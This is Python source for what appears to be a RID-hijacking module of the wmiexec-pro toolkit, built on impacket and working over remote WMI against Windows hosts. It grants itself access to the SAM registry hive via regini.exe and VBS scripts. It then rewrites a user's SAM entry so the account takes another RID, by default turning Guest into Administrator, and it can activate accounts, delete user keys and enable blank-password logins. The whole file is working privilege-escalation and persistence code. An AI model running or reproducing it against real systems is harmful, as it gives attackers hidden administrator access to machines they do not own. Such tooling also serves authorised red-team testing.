import sys
import numpy
import base64
import uuid
import json
import time
import os
import logging

from lib.helpers import get_vbs
from lib.methods.executeVBS import executeVBS_Toolkit
from lib.modules.exec_command import EXEC_COMMAND
from impacket.dcerpc.v5.dtypes import NULL


class RID_Hijack_Toolkit():
    def __init__(self, iWbemLevel1Login, dcom):
        self.iWbemLevel1Login = iWbemLevel1Login
        self.dcom = dcom
        self.timeout = 5

        self.logger = logging.getLogger("wmiexec-pro")
        self.logger_countdown = logging.getLogger("CountdownLogger")

    def save_ToFile(self, hostname, rid, content):
        path = os.path.join("save", hostname)
        save_FileName = f"RID-{rid}-{int(time.time())!s}.json"

        if not os.path.exists(path):
            os.makedirs(path, exist_ok=True)
    
        result = os.path.join(path, save_FileName)
        with open(result, "w") as f:
            f.write(content)

        self.logger.log(100, f"Save user profile data to: {result}")

    def query_user(self):
        iWbemServices = self.iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
        self.iWbemLevel1Login.RemRelease()
        iEnumWbemClassObject = iWbemServices.ExecQuery("SELECT Name, SID, Disabled, PasswordExpires, PasswordChangeable, PasswordRequired FROM Win32_UserAccount")
        while True:
            try:
                Users_Info = iEnumWbemClassObject.Next(0xffffffff,1)[0]
                self.logger.log(100, "Get user information: Name: {}, SID: {}, Disabled: {}, PasswordExpires: {}, PasswordChangeable: {}, PasswordRequired: {}".format(
                    Users_Info.Name,
                    Users_Info.SID,
                    Users_Info.Disabled,
                    Users_Info.PasswordExpires,
                    Users_Info.PasswordChangeable,
                    Users_Info.PasswordRequired
                ))
            except Exception as e:
                if str(e).find("S_FALSE") < 0:
                    pass
                else:
                    break

    def Permissions_Controller(self, action, user, currentUsers):
        exec_command = EXEC_COMMAND(self.iWbemLevel1Login, codec="gbk")
        executer_vbs = executeVBS_Toolkit(self.iWbemLevel1Login)

        # For old system, if command too long with cause error in Win32_ScheduledJob create method
        # so we need to write batch file on target then execute it.
        if "old" in action:
            regini_Attr =[
                "HKEY_LOCAL_MACHINE\\SAM [1 17]",
                "HKEY_LOCAL_MACHINE\\SAM\\SAM [1 17]",
                "HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains [1 17]",
                "HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account [1 17]",
                "HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users [1 17]",
                f'HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\{format(int(hex(int(user)), 16), "08x")!s} [1 17]'
            ]

            # No more retrieve options :)
            #if "retrieve" in action:
            #    for i in range(1, len(regini_Attr)): regini_Attr[i] = regini_Attr[i].replace("[1 17]","[17]")
            self.logger.info("Granting / Restricting user permissions to registry key via regini.exe")

            ini_Content = ""
            for i in regini_Attr:
                ini_Content += i + "\r\n"

            ini_FileName = f"windows-object-{uuid.uuid4()!s}.ini"

            vbs = get_vbs("Exec-Command-Silent-UnderNT6-II.vbs")
            vbs = vbs.replace("REPLACE_WITH_DEST", f"C:\\windows\\temp\\{ini_FileName}").replace("REPLACE_WITH_DATA", base64.b64encode(ini_Content.encode("utf-8")).decode("utf-8")).replace("REPLACE_WITH_COMMAND", f"regini.exe C:\\windows\\temp\\{ini_FileName}")

            tag = executer_vbs.ExecuteVBS(vbs_content=vbs, returnTag=True)
            exec_command.timer_For_UnderNT6()
            executer_vbs.remove_Event(tag)
            self.logger.log(100, "Granted / Restricted user permissions to registry key via regini.exe")
        else:
            self.logger.info("Granting / Restricting user permissions to registry key via regini.exe")

            vbs = get_vbs("GrantSamAccessPermission.vbs")
            vbs = vbs.replace("REPLACE_WITH_USER", currentUsers)
            tag = executer_vbs.ExecuteVBS(vbs_content=vbs, returnTag=True)

            for i in range(self.timeout, 0,-1):
                self.logger_countdown.info(f"Waiting {i}s for next step.\r")
                time.sleep(1)

            executer_vbs.remove_Event(tag)
            self.logger.log(100, "Granted / Restricted user permissions to registry key via regini.exe")

    # Default is hijacking guest(RID=501) users to administrator(RID=500)
    def hijack(self, action, user, hijack_RID=None, hostname=None):
        iWbemServices = self.iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
        self.iWbemLevel1Login.RemRelease()

        iWbemServices2 = self.iWbemLevel1Login.NTLMLogin("//./root/DEFAULT", NULL, NULL)
        StdRegProv, resp = iWbemServices2.GetObject("StdRegProv")

        # Check user if it existed.
        try: 
            iEnumWbemClassObject = iWbemServices.ExecQuery(f'SELECT * FROM Win32_UserAccount where SID like "%-{user}"')
            iEnumWbemClassObject.Next(0xffffffff,1)[0]
        except Exception as e:
            if "WBEM_S_FALSE" in str(e):
                self.logger.error(f"User with RID: {user} not found!")
            else:
                self.logger.error(f"Unexpected error: {e!s}")
            self.dcom.disconnect()
            sys.exit(0)
        
        # Check permission first
        try:
            raw_value = StdRegProv.GetBinaryValue(2147483650, f'SAM\\SAM\\Domains\\Account\\Users\\{format(int(hex(int(user)), 16), "08x")!s}', "F")
            len(raw_value.uValue)
        except Exception as e:
            if "NoneType" in str(e):
                self.logger.error('Looks like we have no permissions to access SAM\\SAM subkeys, please grant full access permissions with: -action "grant" or -action "grant-old" (2003)')
            else:
                self.logger.error(f"Unknown error: {e!s}")
        else:
            if action == "remove":
                StdRegProv.DeleteKey(2147483650, f'SAM\\SAM\\Domains\\Account\\Users\\{format(int(hex(int(user)), 16), "08x")!s}')
                self.logger.log(100, "Remove user!")
            elif action == "backup":
                self.backup_UserProfile(user, hostname, StdRegProv)
            else:
                # Impacket will return native integer list like this:
                # [3, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255,255, 255, 255, 127, 0, 0, 0, 0, 0, 0, 0, 0, 245, 1, 0, 0, 1, 2, 0, 0, 20, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,0, 0, 0, 52, 0, 52, 0, 0, 0]
                #
                # This is native binary strings, so we need to conver it to this first like this (every four integer add to a list)
                # [03, 00, 01, 00],[00, 00, 00, 00]....
                #
                # Next, reverse the list and combine it, the convert to integer
                # [00, 01, 00, 03] to 00010003(hex) to 65539(int)
                #
                # Finally, to will get a integer list, but the length of the list is less than 80, so we need to append zero until to length is match 80
                raw_value = numpy.array_split(raw_value.uValue, 20)
                result=[]
                for i in raw_value:
                    raw = ""
                    for j in list(i[::-1]):
                        raw+="%.2x"%j
                    result.append(eval(f"0x{raw}"))
                
                # Appending zero
                result.extend([0]*(80-len(result)))

                # Index 12 is rid
                if action == "hijack":
                    result[12] = int(hijack_RID)
                    self.logger.log(100, f"Hijacking user from RID: {user} to RID: {hijack_RID}")

                # Enable user index 14 = 532, disable is 533
                elif action == "activate":
                    result[14] = 532
                    self.logger.log(100, "Activate target user.")
                elif action == "deactivate":
                    result[14] = 533
                    self.logger.log(100, "Deactivate target user.")
                
                StdRegProv.SetBinaryValue(2147483650, f'SAM\\SAM\\Domains\\Account\\Users\\{format(int(hex(int(user)), 16), "08x")!s}', "F", result)

    def backup_UserProfile(self, user, hostname, StdRegProv=None):
        if not StdRegProv:
            iWbemServices = self.iWbemLevel1Login.NTLMLogin("//./root/DEFAULT", NULL, NULL)
            self.iWbemLevel1Login.RemRelease()
            StdRegProv, resp = iWbemServices.GetObject("StdRegProv")
        value_Name = StdRegProv.EnumValues(2147483650, f'SAM\\SAM\\Domains\\Account\\Users\\{format(int(hex(int(user)), 16), "08x")!s}')
        backup_Dict = {
            "user-RID":int(user),
            "key-Value":[]
        }
        for valueName in value_Name.sNames:
            value_Dict = {}
            raw_value = StdRegProv.GetBinaryValue(2147483650, f'SAM\\SAM\\Domains\\Account\\Users\\{format(int(hex(int(user)), 16), "08x")!s}', valueName)
            raw_value_length = len(raw_value.uValue)
            raw_value = numpy.array_split(raw_value.uValue, (raw_value_length / 4))
            result=[]
            for i in raw_value:
                raw = ""
                for j in list(i[::-1]):
                    raw+="%.2x"%j
                result.append(eval(f"0x{raw}"))
            
            # Appending zero
            result.extend([0]*(raw_value_length - len(result)))
            
            # Add to dict
            value_Dict["valueName"] = valueName
            value_Dict["length"] = raw_value_length
            value_Dict["data"] = result
            
            # Save to final dict
            backup_Dict["key-Value"].append(value_Dict)
        
        self.save_ToFile(hostname, user, json.dumps(backup_Dict, indent=4))

    def restore_UserProfile(self, file):
        with open(file) as json_Data:
            data = json.load(json_Data)
        iWbemServices = self.iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
        self.iWbemLevel1Login.RemRelease()
        StdRegProv, resp = iWbemServices.GetObject("StdRegProv")
        StdRegProv.CreateKey(2147483650, f'SAM\\SAM\\Domains\\Account\\Users\\{format(int(hex(int(data["user-RID"])), 16), "08x")!s}')
        for i in data["key-Value"]:
            StdRegProv.SetBinaryValue(2147483650, f'SAM\\SAM\\Domains\\Account\\Users\\{format(int(hex(int(data["user-RID"])), 16), "08x")!s}', i["valueName"], i["data"])

        self.logger.log(100, f'User with RID: {data["user-RID"]} restore successful!')

    # For Guest user
    def BlankPasswordLogin(self, action):
        iWbemServices = self.iWbemLevel1Login.NTLMLogin("//./root/DEFAULT", NULL, NULL)
        self.iWbemLevel1Login.RemRelease()
        StdRegProv, resp = iWbemServices.GetObject("StdRegProv")
        if action == "enable":
            StdRegProv.SetDWORDValue(2147483650, "SYSTEM\\CurrentControlSet\\Control\\Lsa", "LimitBlankPasswordUse", 0)
            self.logger.log(100, "Enable blank password login.")
        elif action == "disable":
            StdRegProv.SetDWORDValue(2147483650, "SYSTEM\\CurrentControlSet\\Control\\Lsa", "LimitBlankPasswordUse", 1)
            self.logger.log(100, "Disable blank password login.")